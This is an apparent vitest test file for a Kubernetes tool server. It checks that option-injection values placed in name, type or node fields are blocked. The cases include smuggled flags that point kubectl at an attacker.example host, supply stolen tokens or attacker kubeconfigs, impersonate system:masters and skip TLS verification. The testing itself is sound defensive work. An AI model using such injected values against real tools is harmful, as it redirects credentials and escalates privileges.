/**
 * A caller-supplied resource name, type, node name or field is a bare word in
 * the command line, and the cluster tool reads a leading "-" there as an
 * option: target, credentials, trust and identity must not be selectable that
 * way through any tool.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { ServerHandle, expectBlocked, startServer } from "../helpers";

let server: ServerHandle;

beforeAll(async () => {
  server = await startServer();
});

afterAll(async () => {
  await server.close();
});

beforeEach(() => {
  server.reset();
});

interface Case {
  tool: string;
  args: Record<string, unknown>;
}

const cases: Case[] = [
  { tool: "kubectl_get", args: { resourceType: "pods", name: "--server=https://attacker.example/collect" } },
  { tool: "kubectl_get", args: { resourceType: "--server=https://attacker.example/collect" } },
  { tool: "kubectl_get", args: { resourceType: "pods", name: "--insecure-skip-tls-verify=true" } },
  { tool: "kubectl_describe", args: { resourceType: "pod", name: "--token=stolen" } },
  { tool: "kubectl_describe", args: { resourceType: "pod", name: "--certificate-authority=/tmp/attacker-ca" } },
  { tool: "kubectl_delete", args: { resourceType: "pods", name: "--kubeconfig=/tmp/attacker-kubeconfig" } },
  { tool: "kubectl_delete", args: { resourceType: "pods", name: "--as-group=system:masters" } },
  { tool: "kubectl_patch", args: { resourceType: "pod", name: "--as=system:admin", patchData: {} } },
  { tool: "kubectl_scale", args: { resourceType: "deployment", name: "--server=https://attacker.example/collect", replicas: 1 } },
  { tool: "kubectl_rollout", args: { subCommand: "restart", resourceType: "--server=https://attacker.example/collect", name: "web" } },
  { tool: "kubectl_create", args: { resourceType: "namespace", name: "--server=https://attacker.example/collect" } },
  { tool: "kubectl_logs", args: { resourceType: "pod", name: "--server=https://attacker.example/collect", namespace: "default" } },
  { tool: "exec_in_pod", args: { name: "--server=https://attacker.example/collect", command: ["echo", "hi"] } },
  { tool: "node_management", args: { operation: "cordon", nodeName: "--server=https://attacker.example/collect" } },
  { tool: "explain_resource", args: { resource: "--server=https://attacker.example/collect" } },
  { tool: "kubectl_generic", args: { command: "get", name: "--server=https://attacker.example/collect" } },
  { tool: "kubectl_generic", args: { command: "get", resourceType: "--server=https://attacker.example/collect" } },
  { tool: "kubectl_generic", args: { command: "get", subCommand: "--server=https://attacker.example/collect" } },
  // The context name the tool actually uses is what remains after a prefix is
  // stripped from the supplied value; the value is unusable as a context and
  // must not reach the command line as an option.
  { tool: "kubectl_context", args: { operation: "set", name: "cluster/--server=https://attacker.example/ctx" } },
];

describe("caller values in positional command-line slots", () => {
  for (const { tool, args } of cases) {
    it(`${tool} refuses ${JSON.stringify(args).slice(0, 90)}`, async () => {
      const outcome = await server.callTool(tool, args);

      await expectBlocked(server, outcome);
    });
  }
});
